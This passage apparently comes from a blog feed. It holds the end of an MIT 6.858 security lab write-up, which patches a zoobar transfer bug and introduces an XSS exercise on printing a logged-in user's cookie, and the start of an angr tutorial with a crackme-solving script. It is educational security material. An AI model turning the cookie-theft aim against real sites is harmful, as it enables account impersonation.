zoobars<br>AttributeError: <span class="hljs-string">&#x27;NoneType&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;zoobars&#x27;</span><br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1683</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n       </span><br><span class="hljs-string"># response，比较长且无意义，这里暂且省略</span><br></code></pre></td></tr></table></figure><p>说明主要的处理逻辑应当是在 <code>zoobar/bank.py</code> 中的 <code>transfer()</code> 函数，接下来就是代码审计+修复环节了，该函数的核心逻辑主要就是开头这一段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">sender, recipient, zoobars</span>):<br>    persondb = person_setup()<br>    senderp = persondb.query(Person).get(sender)<br>    recipientp = persondb.query(Person).get(recipient)<br><br>    sender_balance = senderp.zoobars - zoobars<br>    recipient_balance = recipientp.zoobars + zoobars<br><br>    <span class="hljs-keyword">if</span> sender_balance &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> recipient_balance &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError()<br><br>    senderp.zoobars = sender_balance<br>    recipientp.zoobars = recipient_balance<br>    persondb.commit()<br><br>    <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>可以看出：</p><ul><li>缺失了对 transfer 数量为负的检查</li><li>重复赋值导致对 self-transfer 的情况计算错误</li></ul><p>修改的办法其实比较简单，由于 username 为主键，故若 <code>sender == recipient</code>，直接跳过转账操作即可，同时对 transfer 数量为负数的情况直接转为 0 即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">sender, recipient, zoobars</span>):<br>    <span class="hljs-comment"># for zoobars &lt; 0, convert it to 0</span><br>    <span class="hljs-keyword">if</span> zoobars &lt; <span class="hljs-number">0</span>:<br>        zoobars = <span class="hljs-number">0</span><br>    <br>    <span class="hljs-comment"># if self-transfer, we don&#x27;t need to do anything</span><br>    <span class="hljs-keyword">if</span> sender != recipient:<br>        persondb = person_setup()<br>        senderp = persondb.query(Person).get(sender)<br>        recipientp = persondb.query(Person).get(recipient)<br><br>        sender_balance = senderp.zoobars - zoobars<br>        recipient_balance = recipientp.zoobars + zoobars<br><br>        <span class="hljs-keyword">if</span> sender_balance &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> recipient_balance &lt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">raise</span> ValueError()<br><br>        senderp.zoobars = sender_balance<br>        recipientp.zoobars = recipient_balance<br>        persondb.commit()<br>    <br>    <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>运行，成功通过所有检查</p><p><img src="https://s2.loli.net/2022/12/25/GYVItmEXyuZCUfo.png" alt="image.png"></p><p>至此，Lab 3 全部完成</p><h1 id="0x04-Lab-4-Browser-security（uncompleted）"><a href="#0x04-Lab-4-Browser-security（uncompleted）" class="headerlink" title="0x04.Lab 4: Browser security（uncompleted）"></a>0x04.Lab 4: Browser security（uncompleted）</h1><h2 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h2><p>本 Lab 主要带大家做基于浏览器的攻击（browser-based attacks，其实就是 web 手玩的那一套），包括：</p><ul><li>Part 1：跨站脚本攻击（cross-site scripting attack，XSS）</li><li>Part 2：侧信道与钓鱼攻击（side channel and phishing attack）</li><li>Part 3：一个简单的蠕虫（a profile worm）</li></ul><h2 id="Network-setup"><a href="#Network-setup" class="headerlink" title="Network setup"></a>Network setup</h2><p>因为我们需要在 web 浏览器构造攻击，为了保证评分系统正常，我们的 zoobar web 服务器必须要在 <code>http://localhost:8080/</code> 上进行访问</p><p><del>如果你是使用 KVM 或 VirtualBox，自己回去翻实验手册</del>；如果你使用 VMWare，我们将通过 ssh 进行端口转发</p><p>首先找到你的虚拟机的 IP：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ip addr show dev eth0</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/25/COioRUJdS81apIG.png" alt="image.png"></p><p>对于 Mac 和 Linux 用户，在宿主机上运行以下命令即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh -L localhost:8080:localhost:8080 student@VM-IP-ADDRESS</span><br>student@VM-IP-ADDRESS&#x27;s password: 6858<br></code></pre></td></tr></table></figure><p>对于 Windows 用户，<del>没救了等死吧</del>，如果你用的是 PuTTY，可以根据这些  <a href="https://web.archive.org/web/20140811071925/http://www.cs.uu.nl/technical/services/ssh/putty/puttyfw.html">instructions</a> 完成设置，<del>如果你用的是 OpenSSH 那就等死吧</del></p><h2 id="Web-browser"><a href="#Web-browser" class="headerlink" title="Web browser"></a>Web browser</h2><p>本 Lab 推荐使用  <a href="https://www.mozilla.com/firefox/">Mozilla Firefox</a> ， <del>说是 Firefox 可以在许多种OS 上跑但👴寻思 Chrome 不照样能而且应用范围不知道比 Firefox 多多少了</del> ，若开启了 ad-blocking 等插件则需要将其关闭</p><h2 id="Setting-up-the-web-server"><a href="#Setting-up-the-web-server" class="headerlink" title="Setting up the web server"></a>Setting up the web server</h2><p>首先还是按惯例保存 Lab 3 的答案，切到 Lab 4 分支，make 一下检查有没有问题：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">student@vm-6858:~$ cd lab<br>student@vm-6858:~/lab$ git commit -am &#x27;my solution to lab3&#x27;<br>[lab3 c54dd4d] my solution to lab3<br> 1 files changed, 1 insertions(+), 0 deletions(-)<br>student@vm-6858:~/lab$ git pull<br>Already up-to-date.<br>student@vm-6858:~/lab$ git checkout -b lab4 origin/lab4<br>Branch lab4 set up to track remote branch lab4 from origin.<br>Switched to a new branch &#x27;lab4&#x27;<br>student@vm-6858:~/lab$ make<br>...<br></code></pre></td></tr></table></figure><p>然后按惯例用下面的语句在 8080 端口跑 zookd：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">student@vm-6858:~/lab$ ./zookd 8080<br></code></pre></td></tr></table></figure><p>然后在  <code>http://localhost:8080/</code> 就可以看到我们的 Zoobar 页面<del>还是一如既往的老样子</del></p><p><img src="https://s2.loli.net/2022/12/25/dU7ZvOKPLX4mzs9.png" alt="image.png"></p><h2 id="Crafting-attacks"><a href="#Crafting-attacks" class="headerlink" title="Crafting attacks"></a>Crafting attacks</h2><p>本 Lab 中我们将用不同的攻击手段来攻击 zoobar，评测系统将在清空注册用户数据库（除了 <code>&quot;attacker&quot;</code> 用户）后运行我们的攻击脚本，与前面的 Lab 类似的是我们同样可以通过 <code>make check</code> 来进行检查，需要注意的是该检查并不够彻底（尤其是对于条件竞争而言），我们可能需要多运行几次来确认攻击成功</p><p>对于 Exercise 5、13、14 与 challenge 而言，<code>make check</code> 脚本不足以看出站点在攻击前后的区别，因此这需要我们自行完成对比（MIT 的老师也会手动完成评测， <del>他真的👴哭死</del> ）；<code>make check</code> 在运行时会在 <code>lab4-tests/</code> 下生成攻击页面应有的外观的图片（<code>answer-XX.ref.png</code>）与我们的攻击页面的实际的样子（<code>answer-XX.png</code>），我们应当要确保两者应当一致</p><h2 id="Part-1-a-cross-site-scripting-XSS-attack"><a href="#Part-1-a-cross-site-scripting-XSS-attack" class="headerlink" title="Part 1: a cross-site scripting (XSS) attack"></a>Part 1: a cross-site scripting (XSS) attack</h2><p>zoobar 的用户界面有一个能从登入用户的浏览器窃取其 cookie 的漏洞（若攻击者能诱导用户点击一个精心构造的连接），我们的工作便是构造这样一个链接</p><p>需求的前置知识：Javascript，DOM 等</p><p>接下来是 Exercise 1，在  <code>answer-1.js</code> 中编写攻击脚本打印出用户的 cookie，本地测试的话就保留一份 <code>zoobar/templates/users.html</code> 的拷贝并添加  <code>&lt;script&gt;</code>  标签来引入攻击脚本：</p><blockquote><p><strong>Exercise 1: Print cookie.</strong></p><p>Cookies are HTTP’s main mechanism for tracking users across requests. If an attacker can get ahold of another user’s cookie, they can completely impersonate that other user. For this exercise, your goal is simply to print the cookie of the currently logged-in user when they access the “Users” page.</p><ol><li><p>Read about how <a href="https://developer.mozilla.org/en-US/docs/Web/API/document.cookie">cookies are accessed from Javascript</a>.</p></li><li><p>Save a copy of <code>zoobar/templates/users.html</code> (you’ll need to restore this original version later). Add a <code>&lt;script&gt;</code> tag to <code>users.html</code> that prints the logged-in user’s cookie using <code>alert()</code></p><p>Your script might not work immediately if you made a Javascript programming error. Fortunately, Chrome has fantastic debugging tools accessible in the Inspector: the JavaScript console, the DOM inspector, and the Network monitor. The JavaScript console lets you see which exceptions are being thrown and why. The DOM Inspector lets you peek at the structure of the page and the properties and methods of each node it contains. The Network monitor allows you to inspect the requests going between your browser and the website. By clicking on one of the requests, you can see what cookie your browser is sending, and compare it to what your script prints.</p></li><li><p>Put the contents of your script in a file named <code>answer-1.js</code>. Your file should only contain javascript (don’t include <code>&lt;script&gt;</code> tags).</p></li></ol></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;感觉不如 CTF 7 天速成课程…画质…&lt;/p&gt;</summary>
    
    
    
    <category term="EXPERIMENTS" scheme="https://arttnba3.github.io/categories/EXPERIMENTS/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="ret2libc" scheme="https://arttnba3.github.io/tags/ret2libc/"/>
    
    <category term="栈溢出" scheme="https://arttnba3.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="符号执行" scheme="https://arttnba3.github.io/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="ret2shellcode" scheme="https://arttnba3.github.io/tags/ret2shellcode/"/>
    
    <category term="实验笔记" scheme="https://arttnba3.github.io/tags/%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MIT" scheme="https://arttnba3.github.io/tags/MIT/"/>
    
    <category term="Concolic Execution" scheme="https://arttnba3.github.io/tags/Concolic-Execution/"/>
    
  </entry>
  
  <entry>
    <title>【ANGR.0x00】从 angr-CTF 入门 angr 的基本用法</title>
    <link href="https://arttnba3.github.io/2022/11/24/ANGR-0X00-ANGR_CTF/"/>
    <id>https://arttnba3.github.io/2022/11/24/ANGR-0X00-ANGR_CTF/</id>
    <published>2022-11-23T15:48:35.000Z</published>
    <updated>2023-09-14T14:44:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>你说的对，但是 <a href="https://github.com/angr/angr">angr</a> 是一个使用 Python 编写的跨平台开源二进制分析框架…</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p><a href="https://github.com/angr/angr">angr</a> 是一个使用 Python 编写的跨平台开源二进制<strong>混合</strong>（Concolic）分析框架，为我们提供了一系列实用的二进制分析工具，更多关于 angr 的介绍信息可以看他们的 <a href="https://angr.io/">官网</a> ，关于 angr 提供的 API 则可以查看<a href="https://api.angr.io/">文档</a></p><p><a href="https://github.com/jakespringer/angr_ctf">angr_ctf</a> 是一个非常好的入门级 angr 练手项目，刚好笔者最近在学 angr 相关的东西，所以决定从这个项目开始入门</p><h2 id="PRE-安装-angr-及相关组件"><a href="#PRE-安装-angr-及相关组件" class="headerlink" title="PRE.安装 angr 及相关组件"></a>PRE.安装 angr 及相关组件</h2><p>首先是一些依赖项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install gcc-multilib</span><br></code></pre></td></tr></table></figure><p>angr 本体安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angr</span><br></code></pre></td></tr></table></figure><p>然后是 <a href="https://github.com/angr/angrop">angrop</a>，可以自动收集 ROP gadget 以及构建 ROP chain</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angrop</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/angr/patcherex">patcherex</a> 也是 angr 团队开发的，用以进行自动化的二进制加固</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install nasm clang</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install clang-10 gcc-avr binutils-avr avr-libc</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/angr/patcherex.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> patcherex</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install -e .</span><br></code></pre></td></tr></table></figure><blockquote><p>阿里云源好像妹有 <code>compilerex</code> 这个依赖项，反正最后👴也妹安装上，难受</p></blockquote><p><a href="https://github.com/angr/rex">rex</a> 则是 angr 团队开发的自动 exp 生成器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">👴妹安成，看看就好</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/angr/angr-management">angr-management</a> 则是图形化的 angr 界面，安好之后直接在终端输入 <code>angr-management</code> 即可直接启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angr-management</span><br></code></pre></td></tr></table></figure><h2 id="PRE2-angr-ctf-基本食用指北"><a href="#PRE2-angr-ctf-基本食用指北" class="headerlink" title="PRE2. angr-ctf 基本食用指北"></a>PRE2. angr-ctf 基本食用指北</h2><p>首先把项目拉到本地：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/jakespringer/angr_ctf.git</span><br></code></pre></td></tr></table></figure><p>之后进入到你想做的题目目录下使用脚本进行编译，比如说 <code>00_angr_find</code>，这里需要我们手动指定一个种子以及输出的文件名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> 00_angr_find/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 generate.py</span> <br>Usage: ./generate.py [seed] [output_file]<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 generate.py 114514 00_angr_find</span><br></code></pre></td></tr></table></figure><h1 id="0x01-angr-ctf：基本用法"><a href="#0x01-angr-ctf：基本用法" class="headerlink" title="0x01. angr-ctf：基本用法"></a>0x01. angr-ctf：基本用法</h1><h2 id="00-angr-find：路径搜索"><a href="#00-angr-find：路径搜索" class="headerlink" title="00_angr_find：路径搜索"></a>00_angr_find：路径搜索</h2><p>惯例拖进 IDA，发现其会读入 8 字节后使用一个自定义函数处理，最后与密码 <code>&quot;XFQUUEQF&quot;</code> 对比：<br><img src="https://s2.loli.net/2022/10/31/vcWPp1GO7uHA8q6.png" alt="image.png"></p><p>按照传统的做逆向的方法是去逆 <code>complex_function()</code> ，逆出逻辑后写出解密脚本，但有了 angr 之后我们便可以使用<strong>符号执行</strong>（symbolic execution）来进行路径约束的自动求解</p><blockquote><p>符号执行简单理解便是将变量作为符号存储，通过分析路径约束获得由符号组成的表达式组，最后对其进行求解</p></blockquote><p>那么我们需要求解的路径约束便是执行到输出 <code>&quot;Good Job.&quot;</code> 的路径，这里笔者选择最后的输出点 <code>0x80492F0</code>：</p><p><img src="https://s2.loli.net/2022/10/31/hdaX8FY9ZVcvIRH.png" alt="image.png"></p><p>那么现在我们来看 angr 的基本用法</p><h3 id="angr-Project-顶层接口"><a href="#angr-Project-顶层接口" class="headerlink" title="angr.Project - 顶层接口"></a>angr.Project - 顶层接口</h3><p>我们若要使用 angr 来分析一个二进制文件，第一步则是创建一个 <code>angr.Project</code> 类——我们一切后续操作都将基于这个类实例进行展开，以下是一个🌰：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr<br><span class="hljs-meta">&gt;&gt;&gt; </span>bin_path = <span class="hljs-string">&#x27;./test&#x27;</span> <span class="hljs-comment"># file to be analyzed</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj = angr.Project(bin_path)<br>WARNING | <span class="hljs-number">2022</span>-<span class="hljs-number">11</span>-<span class="hljs-number">23</span> <span class="hljs-number">19</span>:<span class="hljs-number">25</span>:<span class="hljs-number">30</span>,006 | cle.loader | The main binary <span class="hljs-keyword">is</span> a position-independent executable. It <span class="hljs-keyword">is</span> being loaded <span class="hljs-keyword">with</span> a base address of <span class="hljs-number">0x400000</span>.<br></code></pre></td></tr></table></figure><p>首先，我们可以通过一个 project 获取对应二进制文件的基本信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.arch     <span class="hljs-comment"># architecture of the binary file</span><br>&lt;Arch AMD64 (LE)&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(proj.entry)    <span class="hljs-comment"># entry point of the binary file</span><br><span class="hljs-string">&#x27;0x401060&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.filename <span class="hljs-comment"># name of the binary file</span><br><span class="hljs-string">&#x27;./test&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><p><code>arch</code> 是一个 <code>archiinfo.Arch</code> 类实例，其包含了运行该文件的 CPU 信息等各种数据</p><ul><li><p><code>arch.bits</code> &amp; <code>arch.bytes</code> ：CPU 的字长（单位为位&#x2F;字节）</p></li><li><p><code>arch.name</code>：架构名，例如  <em>X86</em>  </p></li><li><p><code>arch.memory_endness</code>：端序，大端为 <code>Endness.BE</code> ，小端为 <code>Endness.LE</code></p><blockquote><p>源码里还有一个 “中端序” <code>Endness.ME</code> ：）</p></blockquote></li></ul></li></ul><h4 id="①-factory-实用类工厂"><a href="#①-factory-实用类工厂" class="headerlink" title="① factory - 实用类工厂"></a>① factory - 实用类工厂</h4><p><code>project.factory</code> 为我们提供了一些实用的类的构造器</p><h5 id="I-block-基本块"><a href="#I-block-基本块" class="headerlink" title="I. block - 基本块"></a>I. block - 基本块</h5><p>angr 以基本块为单位分析代码，我们可以通过 <code>project.factory.block(address)</code> 获取给定地址所在的<strong>基本块</strong>——一个 <code>Block</code> 类实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>block = proj.factory.block(proj.entry) <span class="hljs-comment"># extract the basic block</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>block.pp() <span class="hljs-comment"># pretty-print of disassemble code of the block</span><br>        _start:<br><span class="hljs-number">401060</span>  endbr64<br><span class="hljs-number">401064</span>  xor     ebp, ebp<br><span class="hljs-number">401066</span>  mov     r9, rdx<br><span class="hljs-number">401069</span>  pop     rsi<br><span class="hljs-number">40</span>106a  mov     rdx, rsp<br><span class="hljs-number">40</span>106d  <span class="hljs-keyword">and</span>     rsp, <span class="hljs-number">0xfffffffffffffff0</span><br><span class="hljs-number">401071</span>  push    rax<br><span class="hljs-number">401072</span>  push    rsp<br><span class="hljs-number">401073</span>  lea     r8, [__libc_csu_fini]<br><span class="hljs-number">40</span>107a  lea     rcx, [__libc_csu_init]<br><span class="hljs-number">401081</span>  lea     rdi, [main]<br><span class="hljs-number">401088</span>  call    qword ptr [<span class="hljs-number">0x403fe0</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>block.instructions <span class="hljs-comment"># instructions in the block</span><br><span class="hljs-number">12</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>block.instruction_addrs <span class="hljs-comment"># addr of each instruction</span><br>(<span class="hljs-number">4198496</span>, <span class="hljs-number">4198500</span>, <span class="hljs-number">4198502</span>, <span class="hljs-number">4198505</span>, <span class="hljs-number">4198506</span>, <span class="hljs-number">4198509</span>, <span class="hljs-number">4198513</span>, <span class="hljs-number">4198514</span>, <span class="hljs-number">4198515</span>, <span class="hljs-number">4198522</span>, <span class="hljs-number">4198529</span>, <span class="hljs-number">4198536</span>)<br></code></pre></td></tr></table></figure><h5 id="II-state-模拟执行状态"><a href="#II-state-模拟执行状态" class="headerlink" title="II. state - 模拟执行状态"></a>II. state - 模拟执行状态</h5><p>angr 使用 <code>SimState</code> 类表示一个 <em>模拟的程序状态</em>  （simulated program state），我们的各种操作实际上是由一个 state 步进到另一个 state 的过程</p><p>我们使用 <code>project.factory.entry_state()</code> 获取一个程序的初始执行状态，使用 <code>project.factory.blank_state(addr)</code> 获取一个程序从指定地址开始执行的空白状态：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()<br><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.blank_state(<span class="hljs-number">0xdeadbeef</span>)<br></code></pre></td></tr></table></figure><ul><li><code>state.regs</code>：寄存器状态组，其中每个寄存器都为一个  <em>位向量</em>  （BitVector），我们可以通过寄存器名称来访问对应的寄存器（例如 <code>state.regs.esp -= 12</code> ）</li><li><code>state.mem</code>：该状态的内存访问接口，我们可以直接通过 <code>state.mem[addr].type</code> 完成内存访问（例如 <code>state.mem[0x1000].long = 4</code> ，对于读而言还需指定 <code>.resolved</code> 或 <code>.concrete</code> 表示位向量或是实际值，例如 <code>state.mem[0x1000].long.concrete</code>）</li><li><code>state.memory</code>：另一种形式的内存访问接口：<ul><li><code>state.memory.load(addr, size_in_bytes)</code> ：获取该地址上指定大小的位向量</li><li><code>state.memory.store(addr, bitvector)</code> ：将一个位向量存储到指定地址</li></ul></li><li><code>state.posix</code>：POSIX 相关的环境接口，例如 <code>state.posix.dumps(fileno)</code> 获取对应文件描述符上的流</li></ul><p>除了这些对模拟执行状态的信息获取接口外，还有一些解决方法的对应接口 <code>state.solver</code>，我们将在后续进行讲解</p><h5 id="III-simulation-manager-模拟执行器"><a href="#III-simulation-manager-模拟执行器" class="headerlink" title="III. simulation_manager - 模拟执行器"></a>III. simulation_manager - 模拟执行器</h5><p>angr 将一个状态的执行方法独立成一个 <code>SimulationManager</code> 类，以下两种写法等效：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.factory.simgr(state)<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.factory.simulation_manager(state)<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<br></code></pre></td></tr></table></figure><ul><li><code>simgr.step()</code>：<strong>以基本块为单位</strong>的单步执行</li><li><code>simgr.explore(addr)</code>：路径探索，即<strong>执行到指定地址</strong>并进行约束求解，将执行完成的状态放在 <code>simgr.found</code> 列表中，若无法求解则该列表为空</li></ul><h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么我们现在已经了解了 angr 的基本使用方法了，而本题我们只需要探索到对应路径即可，于是最后的求解脚本如下，详见注释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./00_angr_find&#x27;</span><br>    proj = angr.Project(bin_path) <span class="hljs-comment"># load the binary file</span><br>    init_state = proj.factory.entry_state() <span class="hljs-comment"># create an empty context</span><br>    simgr = proj.factory.simgr(init_state) <span class="hljs-comment"># create a simulator_manager</span><br>    obj_path_addr = <span class="hljs-number">0x80492F0</span> <span class="hljs-comment"># the path we&#x27;d like to explore</span><br>    simgr.explore(find = obj_path_addr) <span class="hljs-comment"># start to explore</span><br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># print the input that solve the constraint</span><br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>一下就跑出来了，很快啊.mp4</p><p><img src="https://s2.loli.net/2022/10/31/BXmxhVOWjQdDwoE.png" alt="image.png"></p><h2 id="01-angr-avoid：路径避免"><a href="#01-angr-avoid：路径避免" class="headerlink" title="01_angr_avoid：路径避免"></a>01_angr_avoid：路径避免</h2><p>惯例拖入 IDA，发现太大了（流汗黄豆.jpg）</p><p><img src="https://s2.loli.net/2022/10/31/sKdFIweu56Sya9H.png" alt="image.png"></p><p>那这里我们手动分析一下，main 的逻辑还是惯例读入 8 字符作为 s1，而 s2 是一个固定值的字符串：</p><p><img src="https://s2.loli.net/2022/10/31/xJFCTN5OZVsjnkG.png" alt="image.png"></p><p>之后大概就是会对 s1、s2 进行一定处理并在各种代码块间跳转，有的路径上会调用到 <code>avoid_me()</code> ，最后都会调用到 <code>maybe_good()</code> ：</p><p><img src="https://s2.loli.net/2022/10/31/fRWJnZhMtyD5qo6.png" alt="image.png"></p><p>那么 <code>maybe_good()</code> 函数看样子应该是我们最终要求解的路径终点，只要满足两个条件：1）<code>should_succeed != 0</code> 2）<code>s1 == s2</code> 便说明我们成功了：</p><p><img 